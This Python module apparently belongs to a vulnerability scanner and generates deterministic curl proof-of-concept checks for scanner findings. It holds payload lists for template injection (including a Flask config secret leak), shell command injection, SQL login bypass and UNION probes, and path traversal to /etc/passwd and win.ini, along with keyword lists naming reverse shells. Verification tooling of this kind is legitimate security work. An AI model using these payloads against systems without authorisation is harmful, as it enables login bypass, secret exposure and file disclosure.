#!/usr/bin/env python3
"""GSC Deterministic PoC Generators — no LLM required.

For well-known vulnerability classes, PoCs are trivially pattern-based.
These don't need DeepSeek — they're instant, cheap, and 100% reproducible.

Supported:
  SSTI: {{7*7}} → 49 → confirmed RCE
  Command Injection: $(echo VULNERABLE) → VULNERABLE → confirmed
  SQLi: ' OR '1'='1 → authentication bypass pattern
  Path Traversal: ../../etc/passwd → root:x:0:0 → confirmed
"""

from __future__ import annotations

import re
from pathlib import Path

# Mapping: rule_id prefix → (kind, payload, success_marker, format)
DETERMINISTIC_RULES: dict[str, tuple[str, str, str, str]] = {
    "YAML-SSTI001": (
        "ssti",
        "{{ 7 * 7 }}",
        "49",
        "curl"
    ),
    "GS020": (
        "ssti",
        "{{ 7 * 7 }}",
        "49",
        "curl"
    ),
    "YAML-A7E2F001": (
        "command_injection",
        "$(echo VULNERABLE)",
        "VULNERABLE",
        "curl"
    ),
    "GS025-command_injection": (
        "command_injection",
        "; echo VULNERABLE #",
        "VULNERABLE",
        "curl"
    ),
}

# SSTI: different template engines, same logic
SSTI_PAYLOADS = [
    ("{{ 7 * 7 }}", "49", "Jinja2/Django — basic arithmetic"),
    ("{{ config }}", "SECRET_KEY|DEBUG|SQLALCHEMY", "Flask config leak"),
    ("${7*7}", "49", "Freemarker — basic arithmetic"),
    ("<%= 7*7 %>", "49", "ERB/eRuby — basic arithmetic"),
]

# Command injection: OS-agnostic patterns
CMD_INJECTION_PAYLOADS = [
    ("$(echo VULNERABLE)", "VULNERABLE", "Unix — subshell echo"),
    ("; echo VULNERABLE #", "VULNERABLE", "Unix — semicolon echo"),
    ("| echo VULNERABLE", "VULNERABLE", "Unix — pipe echo"),
    ('`echo VULNERABLE`', "VULNERABLE", "Unix — backtick echo"),
    ('& echo VULNERABLE &', "VULNERABLE", "Windows — ampersand echo"),
]

# SQLi: login bypass / data extraction
SQLI_PAYLOADS = [
    ("' OR '1'='1", "logged in|welcome|success", "SQLi — OR 1=1 bypass"),
    ("' OR 1=1 --", "logged in|welcome|success", "SQLi — OR 1=1 comment"),
    ("admin' --", "logged in|welcome|success", "SQLi — admin bypass"),
    ("' UNION SELECT 1,2,3 --", "2", "SQLi — UNION column count"),
]

# Path Traversal
PATH_TRAVERSAL_PAYLOADS = [
    ("../../etc/passwd", "root:x:0:0", "Linux — /etc/passwd"),
    ("../../../etc/passwd", "root:x:0:0", "Linux — deep traversal"),
    ("..\\..\\..\\windows\\win.ini", "[fonts]", "Windows — win.ini"),
]


class DeterministicPoC:
    """A deterministic (non-LLM) proof-of-concept."""

    def __init__(self, payload: str, marker: str, kind: str, fmt: str = "curl"):
        self.payload = payload
        self.marker = marker
        self.kind = kind
        self.fmt = fmt
        self.impact = f"{kind}: payload '{payload}' should reveal '{marker}'"

    def to_dict(self) -> dict:
        return {
            "code": self._generate_code(),
            "impact": self.impact,
            "fmt": self.fmt,
            "payload": self.payload,
            "marker": self.marker,
            "deterministic": True,
        }

    def _generate_code(self) -> str:
        """Generate executable PoC code based on kind."""
        if self.fmt == "curl":
            # Curl-based PoC — inject payload into a URL query parameter via
            # --data-urlencode so spaces/metachars ({{ 7 * 7 }}, ' OR '1'='1)
            # are percent-encoded and reach the server intact.
            return (
                f"# Deterministic {self.kind} PoC\n"
                f"# Replace TARGET_URL with the actual endpoint\n"
                f"# Payload: {self.payload}\n"
                f"curl -s -G 'TARGET_URL' --data-urlencode \"input={self.payload}\" "
                f"| grep -q '{self.marker}' "
                f"&& echo VULNERABLE && exit 0 "
                f"|| echo SAFE && exit 1"
            )
        if self.fmt == "python":
            return (
                f"# Deterministic {self.kind} PoC\n"
                f"import sys, subprocess\n"
                f"result = subprocess.run(\n"
                f"    ['curl', '-s', f'TARGET_URL?input={self.payload}'],\n"
                f"    capture_output=True, text=True\n"
                f")\n"
                f"if '{self.marker}' in result.stdout:\n"
                f"    print('VULNERABLE'); sys.exit(0)\n"
                f"print('SAFE'); sys.exit(1)"
            )
        return f"# {self.kind} PoC: {self.payload}\n"


def get_deterministic_poc(rule_id: str) -> DeterministicPoC | None:
    """Get a deterministic PoC for a given rule_id. Returns None if not available."""
    for prefix, (kind, payload, marker, fmt) in DETERMINISTIC_RULES.items():
        if rule_id.startswith(prefix):
            return DeterministicPoC(payload, marker, kind, fmt)

    # Fallback: check finding title for SSTI/command injection keywords
    title_lower = rule_id.lower()
    if any(kw in title_lower for kw in ("ssti", "template_injection", "jinja2", "render_template")):
        payload, marker, _ = SSTI_PAYLOADS[0]
        return DeterministicPoC(payload, marker, "ssti")

    if any(kw in title_lower for kw in ("command_injection", "os.system", "exec", "reverse_shell")):
        payload, marker, _ = CMD_INJECTION_PAYLOADS[0]
        return DeterministicPoC(payload, marker, "command_injection")

    if any(kw in title_lower for kw in ("sql_injection", "sqli")):
        payload, marker, _ = SQLI_PAYLOADS[0]
        return DeterministicPoC(payload, marker, "sqli")

    if any(kw in title_lower for kw in ("path_traversal", "lfi", "directory_traversal")):
        payload, marker, _ = PATH_TRAVERSAL_PAYLOADS[0]
        return DeterministicPoC(payload, marker, "path_traversal")

    return None


def attach_deterministic_pocs(findings: list[dict]) -> list[dict]:
    """Attach deterministic PoCs to findings that support them. Mutates in-place."""
    count = 0
    for f in findings:
        rule_id = f.get("rule_id", f.get("title", ""))
        poc = get_deterministic_poc(rule_id)
        if poc:
            f.setdefault("metadata", {})["poc"] = poc._generate_code()
            f["metadata"]["poc_payload"] = poc.payload
            f["metadata"]["poc_impact"] = poc.impact
            f["metadata"]["poc_format"] = poc.fmt
            f["metadata"]["poc_deterministic"] = True
            count += 1
    return findings


# ── Test ───────────────────────────────────────────────────────────────────

if __name__ == "__main__":
    # Test deterministic PoCs
    tests = [
        ("YAML-SSTI001", "SSTI detector"),
        ("GS020", "GS020 XSS/SSTI"),
        ("YAML-A7E2F001", "Reverse shell"),
        ("GS005", "SQLi — NO deterministic yet"),
        ("GS001", "Secrets — NO deterministic"),
    ]
    for rule_id, label in tests:
        poc = get_deterministic_poc(rule_id)
        status = "✅" if poc else "❌"
        print(f"{status} {label} ({rule_id})")
        if poc:
            print(f"   payload={poc.payload} marker={poc.marker}")

    # Test attachment
    findings = [
        {"rule_id": "YAML-SSTI001", "file_path": "app.py", "line": 42},
        {"rule_id": "YAML-A7E2F001", "file_path": "shell.py", "line": 10},
        {"rule_id": "GS005", "file_path": "db.py", "line": 5},  # no deterministic
    ]
    attach_deterministic_pocs(findings)
    for f in findings:
        if "metadata" in f:
            print(f"Attached: {f['rule_id']} → {f['metadata'].get('poc')}")
